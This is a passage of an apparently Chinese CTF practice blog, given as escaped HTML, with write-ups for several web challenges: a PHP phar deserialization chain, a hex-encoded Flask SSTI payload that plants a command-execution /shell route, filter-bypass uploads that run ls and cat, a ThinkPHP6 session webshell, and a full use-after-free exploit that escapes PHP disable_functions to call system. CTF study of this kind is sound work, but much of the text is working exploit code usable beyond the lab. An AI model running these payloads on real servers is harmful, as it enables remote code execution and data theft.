type&#x3D;&quot;file&quot; name&#x3D;&quot;file&quot; id&#x3D;&quot;file&quot;&gt;&lt;br&gt;     &lt;input type&#x3D;&quot;submit&quot; name&#x3D;&quot;submit&quot; value&#x3D;&quot;提交&quot;&gt; &lt;&#x2F;div&gt; &lt;&#x2F;script&gt; &lt;&#x2F;body&gt; &lt;&#x2F;html&gt;</code></pre><p>class.php</p><pre class="language-none"><code class="language-none">&lt;?php &#x2F;&#x2F;show_source(__FILE__); include &quot;base.php&quot;; header(&quot;Content-type: text&#x2F;html;charset&#x3D;utf-8&quot;); error_reporting(0); function upload_file_do() &#123;     global $_FILES;     $filename &#x3D; md5($_FILES[&quot;file&quot;][&quot;name&quot;].$_SERVER[&quot;REMOTE_ADDR&quot;]).&quot;.jpg&quot;;     &#x2F;&#x2F;mkdir(&quot;upload&quot;,0777);     if(file_exists(&quot;upload&#x2F;&quot; . $filename)) &#123;         unlink($filename);     &#125;     move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;],&quot;upload&#x2F;&quot; . $filename);     echo &#39;&lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt;alert(&quot;上传成功!&quot;);&lt;&#x2F;script&gt;&#39;; &#125; function upload_file() &#123;     global $_FILES;     if(upload_file_check()) &#123;         upload_file_do();     &#125; &#125; function upload_file_check() &#123;     global $_FILES;     $allowed_types &#x3D; array(&quot;gif&quot;,&quot;jpeg&quot;,&quot;jpg&quot;,&quot;png&quot;);     $temp &#x3D; explode(&quot;.&quot;,$_FILES[&quot;file&quot;][&quot;name&quot;]);     $extension &#x3D; end($temp);     if(empty($extension)) &#123;         &#x2F;&#x2F;echo &quot;&lt;h4&gt;请选择上传的文件:&quot; . &quot;&lt;h4&#x2F;&gt;&quot;;     &#125;     else&#123;         if(in_array($extension,$allowed_types)) &#123;             return true;         &#125;         else &#123;             echo &#39;&lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt;alert(&quot;Invalid file!&quot;);&lt;&#x2F;script&gt;&#39;;             return false;         &#125;     &#125; &#125; ?&gt; </code></pre><p>class.php</p><pre class="language-none"><code class="language-none">&lt;?phpclass C1e4r&#123;    public $test;    public $str;    public function __construct($name)    &#123;        $this-&gt;str &#x3D; $name;    &#125;    public function __destruct()    &#123;        $this-&gt;test &#x3D; $this-&gt;str;        echo $this-&gt;test;    &#125;&#125;class Show&#123;    public $source;    public $str;    public function __construct($file)    &#123;        $this-&gt;source &#x3D; $file;   &#x2F;&#x2F;$this-&gt;source &#x3D; phar:&#x2F;&#x2F;phar.jpg        echo $this-&gt;source;    &#125;    public function __toString()    &#123;        $content &#x3D; $this-&gt;str[&#39;str&#39;]-&gt;source;        return $content;    &#125;    public function __set($key,$value)    &#123;        $this-&gt;$key &#x3D; $value;    &#125;    public function _show()    &#123;        if(preg_match(&#39;&#x2F;http|https|file:|gopher|dict|\.\.|f1ag&#x2F;i&#39;,$this-&gt;source)) &#123;            die(&#39;hacker!&#39;);        &#125; else &#123;            highlight_file($this-&gt;source);        &#125;            &#125;    public function __wakeup()    &#123;        if(preg_match(&quot;&#x2F;http|https|file:|gopher|dict|\.\.&#x2F;i&quot;, $this-&gt;source)) &#123;            echo &quot;hacker~&quot;;            $this-&gt;source &#x3D; &quot;index.php&quot;;        &#125;    &#125;&#125;class Test&#123;    public $file;    public $params;    public function __construct()    &#123;        $this-&gt;params &#x3D; array();    &#125;    public function __get($key)    &#123;        return $this-&gt;get($key);    &#125;    public function get($key)    &#123;        if(isset($this-&gt;params[$key])) &#123;            $value &#x3D; $this-&gt;params[$key];        &#125; else &#123;            $value &#x3D; &quot;index.php&quot;;        &#125;        return $this-&gt;file_get($value);    &#125;    public function file_get($value)    &#123;        $text &#x3D; base64_encode(file_get_contents($value));        return $text;    &#125;&#125;?&gt;</code></pre><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211125204709437.png" alt="image-20211125204709437"></p><p>肯定是用这个函数来读取flag文件，但是没有反序列化的地方</p><p>加个新知识</p><p><strong>利用phar协议实现反序列化漏洞攻击</strong></p><p><strong>漏洞成因</strong> </p><p>phar文件会以序列化的形式存储用户自定义的meta-data；该方法在文件系统函数(file_exists()、is_dir()等)参数可控的情况下，配合phar://伪协议，可以不依赖unserialize()直接进行反序列化操作</p><p>原理分析 </p><p>phar的组成</p><p>通过查阅手册发现phar由四部分组成；翻阅手册可以知道，phar由四个部分组成，分别是<code>stub、manifest describing the contents、 the file contents、 [optional] a signature for verifying Phar integrity (phar file format only)</code> 下面进行解释一下；</p><p>1 .0  a stub</p><p>标识作用，格式为</p><pre class="language-none"><code class="language-none">xxx&lt;?php xxx; __HALT_COMPILER();?&gt;</code></pre><p>，前面任意，但是一定要以__HALT_COMPILER();?&gt;结尾，否则php无法识别这是一个phar文件；</p><p>2 .0 </p><p>a manifest describing the contents</p><p>其实可以理解为phar文件本质上是一中压缩文件，其中包含有压缩信息和权限，当然我们需要利用的序列化也在里面；</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/425be1b3b3df9e7799bbae0ade22b5ac-16378452560562.png" alt="425be1b3b3df9e7799bbae0ade22b5ac.png"></p><p>3 .0 the file contents</p><p>这里指的是被压缩文件的内容；</p><p>4 .0 [optional] a signature for verifying Phar integrity (phar file format only)</p><p>签名，放在结尾；</p><p><strong>C1e4r类中有__destruct(),</strong></p><p>__destruct()是PHP中的析构方法，在对象被销毁时被调用，程序结束时会被自动调用销毁对象。</p><p>函数中发现了echo，那么要利用echo $this-&gt;test。</p><p><strong>show类有__toString(),</strong></p><p>__toString方法在将一个对象转化成字符串时被自动调用，比如进行echo，print操作时会被调用并返回一个字符串。</p><p>利用$this-&gt;str[&#39;str&#39;]-&gt;source;</p><p><strong>Test类有__get（）</strong></p><p>__get（）当未定义的属性或没有权限访问的属性被访问时该方法会被调用。</p><p>利用 $this-&gt;get --&gt; $this-&gt;file_get($value); --&gt;base64_encode(file_get_contents($value));</p><p>利用C1e4r类的<code>__destruct()</code>中的echo this-&gt;test<br>2.触发Show类的<code>__toString()</code><br>3.利用Show类的<code>this-&gt;test2.触发Show类的</code>__toString()<code>3.利用Show类的</code>content = $this-&gt;str[&#39;str&#39;]-&gt;source<code>4.触发Test类的</code>__get()<code>5.成功利用</code>file_get()`读文件</p><p>反序列化结果</p><pre class="language-none"><code class="language-none">&lt;?phpclass C1e4r&#123;    public $test;    public $str;&#125;class Show&#123;    public $source;    public $str;&#125;class Test&#123;    public $file;    public $params;&#125;$a &#x3D; new C1e4r();$b &#x3D; new Show();$c &#x3D; new Test();$a -&gt;str &#x3D; $b;$b -&gt;str[&#39;str&#39;] &#x3D; $c;$c -&gt;params[&#39;source&#39;] &#x3D; &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;f1ag.php&#39;;$phar &#x3D; new Phar(&quot;exp.phar&quot;); &#x2F;&#x2F;.phar文件$phar-&gt;startBuffering();$phar-&gt;setStub(&#39;&lt;?php __HALT_COMPILER(); ? &gt;&#39;); &#x2F;&#x2F;固定的$phar-&gt;setMetadata($a); &#x2F;&#x2F;触发的头是C1e4r类，所以传入C1e4r对象$phar-&gt;addFromString(&quot;exp.txt&quot;, &quot;test&quot;); &#x2F;&#x2F;随便写点什么生成个签名$phar-&gt;stopBuffering();?&gt;</code></pre><p>生成phar文件后，改个后缀上传就行，phar的文件不管什么后缀都会直接执行</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211125235333537.png" alt="image-20211125235333537"></p><p>看上传的文件（也可以根据源码推文件名，然后利用phar://协议访问</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211125235401120.png" alt="image-20211125235401120"></p><p>得到flag</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211125235433599.png" alt="image-20211125235433599"></p><h2 id="HarekazeCTF2019-encode-and-encode"><a href="#HarekazeCTF2019-encode-and-encode" class="headerlink" title="[HarekazeCTF2019]encode_and_encode"></a>[HarekazeCTF2019]encode_and_encode</h2><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211129200049514.png" alt="image-20211129200049514"></p><p>source</p><pre class="language-none"><code class="language-none">&lt;?phperror_reporting(0);if (isset($_GET[&#39;source&#39;])) &#123;  show_source(__FILE__);  exit();&#125;function is_valid($str) &#123;  $banword &#x3D; [    &#x2F;&#x2F; no path traversal    &#39;\.\.&#39;,    &#x2F;&#x2F; no stream wrapper    &#39;(php|file|glob|data|tp|zip|zlib|phar):&#39;,    &#x2F;&#x2F; no data exfiltration    &#39;flag&#39;  ];  $regexp &#x3D; &#39;&#x2F;&#39; . implode(&#39;|&#39;, $banword) . &#39;&#x2F;i&#39;;  if (preg_match($regexp, $str)) &#123;    return false;  &#125;  return true;&#125;$body &#x3D; file_get_contents(&#39;php:&#x2F;&#x2F;input&#39;); #body获取post数据$json &#x3D; json_decode($body, true); #对body变量进行json解码if (is_valid($body) &amp;&amp; isset($json) &amp;&amp; isset($json[&#39;page&#39;])) &#123;#判断body变量是否有效，json数据要有page  $page &#x3D; $json[&#39;page&#39;];  $content &#x3D; file_get_contents($page); #从page中读出文件名，并读取文件  if (!$content || !is_valid($content)) &#123;#检查content是否有效,即不能明文传输flag文件，利用php伪协议绕过    $content &#x3D; &quot;&lt;p&gt;not found&lt;&#x2F;p&gt;\n&quot;;  &#125;&#125; else &#123;  $content &#x3D; &#39;&lt;p&gt;invalid request&lt;&#x2F;p&gt;&#39;;&#125;&#x2F;&#x2F; no data exfiltration!!!$content &#x3D; preg_replace(&#39;&#x2F;HarekazeCTF\&#123;.+\&#125;&#x2F;i&#39;, &#39;HarekazeCTF&#123;&lt;censored&gt;&#125;&#39;, $content);#如果查到content里有相关的ctf字样，则用censored替代echo json_encode([&#39;content&#39; &#x3D;&gt; $content]);#最后将json编码后的content输出</code></pre><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211129200455993.png" alt="image-20211129200455993"></p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211129200943757.png" alt="image-20211129200943757"></p><h2 id="WUSTCTF2020-CV-Maker"><a href="#WUSTCTF2020-CV-Maker" class="headerlink" title="[WUSTCTF2020]CV Maker"></a>[WUSTCTF2020]CV Maker</h2><p>进去后是个看起来很高端的界面，但是注册然后登录后有个明显 的上传位置</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211129203949145.png" alt="image-20211129203949145"></p><p>通过更改头像传个马上去，蚁剑连接就行</p><p>这里前端有个判断图片类型的地方，所以先传个jpg再bp抓包改成php就行</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211129204113745.png" alt="image-20211129204113745"></p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211129203758946.png" alt="image-20211129203758946"></p><h2 id="RootersCTF2019-I-lt-3-Flask"><a href="#RootersCTF2019-I-lt-3-Flask" class="headerlink" title="[RootersCTF2019]I_&lt;3_Flask"></a>[RootersCTF2019]I_&lt;3_Flask</h2><p>ssti注入，用使用工具Arjun进行参数爆破</p><p>然后找到name参数后，拿出珍藏的写入shell的payload</p><p><a href="https://xz.aliyun.com/t/9008">ctf中flask_ssti的各种绕过技巧 - 先知社区 (aliyun.com)</a></p><pre class="language-none"><code class="language-none">&#123;% if 1&#x3D;&#x3D;lipsum[&#39;__globals__&#39;][&#39;__builtins__&#39;][&#39;exec&#39;](&#39;\x66\x72\x6f\x6d\x20\x66\x6c\x61\x73\x6b\x20\x69\x6d\x70\x6f\x72\x74\x20\x63\x75\x72\x72\x65\x6e\x74\x5f\x61\x70\x70\x0a\x0a\x40\x63\x75\x72\x72\x65\x6e\x74\x5f\x61\x70\x70\x2e\x72\x6f\x75\x74\x65\x28\x27\x2f\x73\x68\x65\x6c\x6c\x27\x2c\x6d\x65\x74\x68\x6f\x64\x73\x3d\x5b\x27\x47\x45\x54\x27\x2c\x27\x50\x4f\x53\x54\x27\x5d\x29\x0a\x64\x65\x66\x20\x73\x68\x65\x6c\x6c\x28\x29\x3a\x0a\x20\x20\x20\x20\x69\x6d\x70\x6f\x72\x74\x20\x6f\x73\x0a\x20\x20\x20\x20\x66\x72\x6f\x6d\x20\x66\x6c\x61\x73\x6b\x20\x69\x6d\x70\x6f\x72\x74\x20\x72\x65\x71\x75\x65\x73\x74\x0a\x20\x20\x20\x20\x63\x6d\x64\x3d\x72\x65\x71\x75\x65\x73\x74\x2e\x61\x72\x67\x73\x2e\x67\x65\x74\x28\x27\x63\x6d\x64\x27\x29\x0a\x20\x20\x20\x20\x72\x74\x3d\x6f\x73\x2e\x70\x6f\x70\x65\x6e\x28\x63\x6d\x64\x29\x2e\x72\x65\x61\x64\x28\x29\x0a\x20\x20\x20\x20\x72\x65\x74\x75\x72\x6e\x20\x72\x74&#39;) %&#125;&#123;% endif%&#125;其中的16进制编码了原始代码   </code></pre><p>即</p><pre class="language-none"><code class="language-none">from flask import current_app@current_app.route(&#39;&#x2F;shell&#39;,methods&#x3D;[&#39;GET&#39;,&#39;POST&#39;])def shell():    import os    from flask import request    cmd&#x3D;request.args.get(&#39;cmd&#39;)    rt&#x3D;os.popen(cmd).read()    return rt</code></pre><p>写入</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211130213039549.png" alt="image-20211130213039549"></p><p>然后直接写入命令</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211130213128899.png" alt="image-20211130213128899"></p><p>可能会出现not found的报错，多试几次</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211130213228889.png" alt="image-20211130213228889"></p><h2 id="CISCN2019-华东南赛区-Double-Secret"><a href="#CISCN2019-华东南赛区-Double-Secret" class="headerlink" title="[CISCN2019 华东南赛区]Double Secret"></a>[CISCN2019 华东南赛区]Double Secret</h2><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211202215102048.png" alt="image-20211202215102048"></p><p>有/secret目录，扫一下或者猜出来</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211202215126891.png" alt="image-20211202215126891"></p><p>arjun扫一下是否有传参</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211202215226926.png" alt="image-20211202215226926"></p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211202215244403.png" alt="image-20211202215244403"></p><p>当数过大时就会进入debug界面，这时候基本就确定这是ssti注入了，可以看看源码</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211202215324285.png" alt="image-20211202215324285"></p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211202215336677.png" alt="image-20211202215336677"></p><p>采用RC4加密的方式，这是一种对称加密，对密文再次加密就会变成明文，密钥是HereIsTreasure，知道这个后，利用cyberchef，对要输入的语句进行加密，再将密文传参进去</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211202215541398.png" alt="image-20211202215541398"></p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211202215555418.png" alt="image-20211202215555418"></p><p>能找到根目录下的flag.txt</p><p>cat读取</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211202215700231.png" alt="image-20211202215700231"></p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211202215712160.png" alt="image-20211202215712160"></p><p>这里应该是取巧了，buu的flag里不包含ciscn，所以这个过滤就没用了</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211202215826313.png" alt="image-20211202215826313"></p><p><a href="https://www.sohu.com/a/370378373_750628">从一道ctf题谈谈flask开启debug模式存在的安全问题_pin (sohu.com)</a></p><h2 id="红明谷CTF-2021-write-shell"><a href="#红明谷CTF-2021-write-shell" class="headerlink" title="[红明谷CTF 2021]write_shell"></a>[红明谷CTF 2021]write_shell</h2><pre class="language-none"><code class="language-none">&lt;?phperror_reporting(0);highlight_file(__FILE__);function check($input)&#123;    if(preg_match(&quot;&#x2F;&#39;| |_|php|;|~|\\^|\\+|eval|&#123;|&#125;&#x2F;i&quot;,$input))&#123;        &#x2F;&#x2F; if(preg_match(&quot;&#x2F;&#39;| |_|&#x3D;|php&#x2F;&quot;,$input))&#123;        die(&#39;hacker!!!&#39;);    &#125;else&#123;        return $input;    &#125;&#125;function waf($input)&#123;  if(is_array($input))&#123;      foreach($input as $key&#x3D;&gt;$output)&#123;          $input[$key] &#x3D; waf($output);      &#125;  &#125;else&#123;      $input &#x3D; check($input);  &#125;&#125;$dir &#x3D; &#39;sandbox&#x2F;&#39; . md5($_SERVER[&#39;REMOTE_ADDR&#39;]) . &#39;&#x2F;&#39;;if(!file_exists($dir))&#123;    mkdir($dir);&#125;switch($_GET[&quot;action&quot;] ?? &quot;&quot;) &#123;    case &#39;pwd&#39;:        echo $dir;        break;    case &#39;upload&#39;:        $data &#x3D; $_GET[&quot;data&quot;] ?? &quot;&quot;;        waf($data);        file_put_contents(&quot;$dir&quot; . &quot;index.php&quot;, $data);&#125;?&gt;</code></pre><p>过滤；可以利用短标签，过滤eval可以采用反引号，过滤空格可以用\t</p><pre class="language-none"><code class="language-none">PHP中有两种短标签，&lt;??&gt;和&lt;?&#x3D;?&gt;。其中，&lt;??&gt;相当于对&lt;?php&gt;的替换。而&lt;?&#x3D;?&gt;则是相当于&lt;? echo&gt;。</code></pre><pre class="language-none"><code class="language-none">?action&#x3D;upload&amp;data&#x3D;&lt;?&#x3D;&#96;ls\t&#x2F;&#96;?&gt;</code></pre><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211206210913770.png" alt="image-20211206210913770"></p><pre class="language-none"><code class="language-none">?action&#x3D;upload&amp;data&#x3D;&lt;?&#x3D;&#96;cat\t&#x2F;flllllll1112222222lag&#96;?&gt;或者?action&#x3D;upload&amp;data&#x3D;&lt;?&#x3D;&#96;cat\t&#x2F;f*&#96;?&gt;*为通配符</code></pre><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211206211136986.png" alt="image-20211206211136986"></p><h2 id="GYCTF2020-EasyThinking"><a href="#GYCTF2020-EasyThinking" class="headerlink" title="[GYCTF2020]EasyThinking"></a>[GYCTF2020]EasyThinking</h2><p>题目时thinkphp6版本的漏洞</p><p><a href="https://ld246.com/article/1579965339516">ThinkPHP6 任意文件操作漏洞分析 - 链滴 (ld246.com)</a></p><p>只需要构造 PHPSESSID 的值即可，值为 <code>string</code>&amp;&amp;长度为 32</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/webp.webp" alt="tp.png"></p><p>此时查看一下生成的 session，生成的 session 文件保存在 <code>\runtime\session</code> 下</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/webp.webp" alt="sessionphp.png"></p><p>session 里的内容:</p><pre class="language-json" data-language="json"><code class="language-json">a:1:&#123;s:4:&quot;name&quot;;s:8:&quot;thinkphp&quot;;&#125;</code></pre><p>可以看到 session 的内容经过了序列化操作，只要将 session 的内容反序列化即可 getshell</p><hr><p>这个师傅构造了一个向SESSION中写入值的类和函数，但是在本题中，搜索的内容直接被写入了SESSION（别问，问就是我也看不懂</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211208205225749.png" alt="image-20211208205225749"></p><p>所以我们可以修改session为.php的后缀，然后</p><p>在搜索栏里搜个马，就可以在/runtime/session路径下访问并执行这个马</p><p>先试试phpinfo</p><p>/runtime/session/sess_0123456789012345678901234568.php</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211208203421218.png" alt="image-20211208203421218"></p><p>写个一句话木马</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211208205558736.png" alt="image-20211208205558736"></p><p>蚁剑连接</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211208205849571.png" alt="image-20211208205849571"></p><p>根目录又flag但是打开没东西，还有一个readflag是二进制文件,猜测是要执行readflag来读取flag文件里的内容</p><p>但是在虚拟终端无法执行命令</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211208210015627.png" alt="image-20211208210015627"></p><p>结合phpinfo里的禁用函数</p><p>能得出这是个突破disable_function限制执行命令的考点</p><p>之前[极客大挑战 2019]RCE ME也有这个考点（往上翻</p><p>但是在这道题里用蚁剑的插件没法绕过</p><p>上个exp（羡慕能写出这种exp的大师傅</p><pre class="language-none"><code class="language-none">&lt;?phppwn(&quot;&#x2F;readflag&quot;);function pwn($cmd)&#123;    global $abc, $helper, $backtrace;    class Vuln    &#123;        public $a;        public function __destruct()        &#123;            global $backtrace;            unset($this-&gt;a);            $backtrace &#x3D; (new Exception)-&gt;getTrace(); # ;)            if (!isset($backtrace[1][&#39;args&#39;])) &#123; # PHP &gt;&#x3D; 7.4                $backtrace &#x3D; debug_backtrace();            &#125;        &#125;    &#125;    class Helper    &#123;        public $a, $b, $c, $d;    &#125;    function str2ptr(&amp;$str, $p &#x3D; 0, $s &#x3D; 8)    &#123;        $address &#x3D; 0;        for ($j &#x3D; $s - 1; $j &gt;&#x3D; 0; $j--) &#123;            $address &lt;&lt;&#x3D; 8;            $address |&#x3D; ord($str[$p + $j]);        &#125;        return $address;    &#125;    function ptr2str($ptr, $m &#x3D; 8)    &#123;        $out &#x3D; &quot;&quot;;        for ($i &#x3D; 0; $i &lt; $m; $i++) &#123;            $out .&#x3D; chr($ptr &amp; 0xff);            $ptr &gt;&gt;&#x3D; 8;        &#125;        return $out;    &#125;    function write(&amp;$str, $p, $v, $n &#x3D; 8)    &#123;        $i &#x3D; 0;        for ($i &#x3D; 0; $i &lt; $n; $i++) &#123;            $str[$p + $i] &#x3D; chr($v &amp; 0xff);            $v &gt;&gt;&#x3D; 8;        &#125;    &#125;    function leak($addr, $p &#x3D; 0, $s &#x3D; 8)    &#123;        global $abc, $helper;        write($abc, 0x68, $addr + $p - 0x10);        $leak &#x3D; strlen($helper-&gt;a);        if ($s !&#x3D; 8) &#123;            $leak %&#x3D; 2 &lt;&lt; ($s * 8) - 1;        &#125;        return $leak;    &#125;    function parse_elf($base)    &#123;        $e_type &#x3D; leak($base, 0x10, 2);        $e_phoff &#x3D; leak($base, 0x20);        $e_phentsize &#x3D; leak($base, 0x36, 2);        $e_phnum &#x3D; leak($base, 0x38, 2);        for ($i &#x3D; 0; $i &lt; $e_phnum; $i++) &#123;            $header &#x3D; $base + $e_phoff + $i * $e_phentsize;            $p_type &#x3D; leak($header, 0, 4);            $p_flags &#x3D; leak($header, 4, 4);            $p_vaddr &#x3D; leak($header, 0x10);            $p_memsz &#x3D; leak($header, 0x28);            if ($p_type &#x3D;&#x3D; 1 &amp;&amp; $p_flags &#x3D;&#x3D; 6) &#123; # PT_LOAD, PF_Read_Write                # handle pie                $data_addr &#x3D; $e_type &#x3D;&#x3D; 2 ? $p_vaddr : $base + $p_vaddr;                $data_size &#x3D; $p_memsz;            &#125; else if ($p_type &#x3D;&#x3D; 1 &amp;&amp; $p_flags &#x3D;&#x3D; 5) &#123; # PT_LOAD, PF_Read_exec                $text_size &#x3D; $p_memsz;            &#125;        &#125;        if (!$data_addr || !$text_size || !$data_size)            return false;        return [$data_addr, $text_size, $data_size];    &#125;    function get_basic_funcs($base, $elf)    &#123;        list($data_addr, $text_size, $data_size) &#x3D; $elf;        for ($i &#x3D; 0; $i &lt; $data_size &#x2F; 8; $i++) &#123;            $leak &#x3D; leak($data_addr, $i * 8);            if ($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;                $deref &#x3D; leak($leak);                # &#39;constant&#39; constant check                if ($deref !&#x3D; 0x746e6174736e6f63)                    continue;            &#125; else continue;            $leak &#x3D; leak($data_addr, ($i + 4) * 8);            if ($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;                $deref &#x3D; leak($leak);                # &#39;bin2hex&#39; constant check                if ($deref !&#x3D; 0x786568326e6962)                    continue;            &#125; else continue;            return $data_addr + $i * 8;        &#125;    &#125;    function get_binary_base($binary_leak)    &#123;        $base &#x3D; 0;        $start &#x3D; $binary_leak &amp; 0xfffffffffffff000;        for ($i &#x3D; 0; $i &lt; 0x1000; $i++) &#123;            $addr &#x3D; $start - 0x1000 * $i;            $leak &#x3D; leak($addr, 0, 7);            if ($leak &#x3D;&#x3D; 0x10102464c457f) &#123; # ELF header                return $addr;            &#125;        &#125;    &#125;    function get_system($basic_funcs)    &#123;        $addr &#x3D; $basic_funcs;        do &#123;            $f_entry &#x3D; leak($addr);            $f_name &#x3D; leak($f_entry, 0, 6);            if ($f_name &#x3D;&#x3D; 0x6d6574737973) &#123; # system                return leak($addr + 8);            &#125;            $addr +&#x3D; 0x20;        &#125; while ($f_entry !&#x3D; 0);        return false;    &#125;    function trigger_uaf($arg)    &#123;        # str_shuffle prevents opcache string interning        $arg &#x3D; str_shuffle(str_repeat(&#39;A&#39;, 79));        $vuln &#x3D; new Vuln();        $vuln-&gt;a &#x3D; $arg;    &#125;    if (stristr(PHP_OS, &#39;WIN&#39;)) &#123;        die(&#39;This PoC is for *nix systems only.&#39;);    &#125;    $n_alloc &#x3D; 10; # increase this value if UAF fails    $contiguous &#x3D; [];    for ($i &#x3D; 0; $i &lt; $n_alloc; $i++)        $contiguous[] &#x3D; str_shuffle(str_repeat(&#39;A&#39;, 79));    trigger_uaf(&#39;x&#39;);    $abc &#x3D; $backtrace[1][&#39;args&#39;][0];    $helper &#x3D; new Helper;    $helper-&gt;b &#x3D; function ($x) &#123;    &#125;;    if (strlen($abc) &#x3D;&#x3D; 79 || strlen($abc) &#x3D;&#x3D; 0) &#123;        die(&quot;UAF failed&quot;);    &#125;    # leaks    $closure_handlers &#x3D; str2ptr($abc, 0);    $php_heap &#x3D; str2ptr($abc, 0x58);    $abc_addr &#x3D; $php_heap - 0xc8;    # fake value    write($abc, 0x60, 2);    write($abc, 0x70, 6);    # fake reference    write($abc, 0x10, $abc_addr + 0x60);    write($abc, 0x18, 0xa);    $closure_obj &#x3D; str2ptr($abc, 0x20);    $binary_leak &#x3D; leak($closure_handlers, 8);    if (!($base &#x3D; get_binary_base($binary_leak))) &#123;        die(&quot;Couldn&#39;t determine binary base address&quot;);    &#125;    if (!($elf &#x3D; parse_elf($base))) &#123;        die(&quot;Couldn&#39;t parse ELF header&quot;);    &#125;    if (!($basic_funcs &#x3D; get_basic_funcs($base, $elf))) &#123;        die(&quot;Couldn&#39;t get basic_functions address&quot;);    &#125;    if (!($zif_system &#x3D; get_system($basic_funcs))) &#123;        die(&quot;Couldn&#39;t get zif_system address&quot;);    &#125;    # fake closure object    $fake_obj_offset &#x3D; 0xd0;    for ($i &#x3D; 0; $i &lt; 0x110; $i +&#x3D; 8) &#123;        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));    &#125;    # pwn    write($abc, 0x20, $abc_addr + $fake_obj_offset);    write($abc, 0xd0 + 0x38, 1, 4); # internal func type    write($abc, 0xd0 + 0x68, $zif_system); # internal func handler    ($helper-&gt;b)($cmd);    exit();&#125;</code></pre><p>把这个php文件找个地方传上去</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211208210715741.png" alt="image-20211208210715741"></p><p>访问这个路径，得到flag</p><p><img 